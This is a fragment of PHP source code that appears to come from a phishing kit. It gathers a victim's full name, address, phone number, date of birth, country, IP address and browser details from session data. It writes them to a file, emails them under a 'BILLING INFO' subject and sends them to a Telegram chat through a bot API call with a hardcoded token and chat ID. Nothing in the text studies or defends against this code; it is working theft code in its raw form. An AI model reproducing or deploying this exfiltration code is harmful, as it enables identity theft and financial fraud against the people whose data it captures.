...
include('./get_ip.php');
$Fname=$_SESSION['fullname'];$Address=$_SESSION['address'];$City=$_SESSION['City'];$State=$_SESSION['stat'];$Zip=$_SESSION['zipcode'];$Phone=$_SESSION['phonenumber'];$DOB=$_SESSION['dob'];$Country=$_SESSION['country'];$IP=$_SESSION['_ip_'];$Usragent=$_SERVER['HTTP_USER_AGENT'];
...
<body    style=' padding:0;margin:0;
	...
	fwrite($khraha, $msg);
    $subject .= "BILLING INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";$headers .= "From: <XBALTI>";$api = "2035318780:AAFF95W4a9Q4qlACGjeLPXzsDT4ekyMVO0I";$chatid = "-1001552903050";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($ygmai)."" );
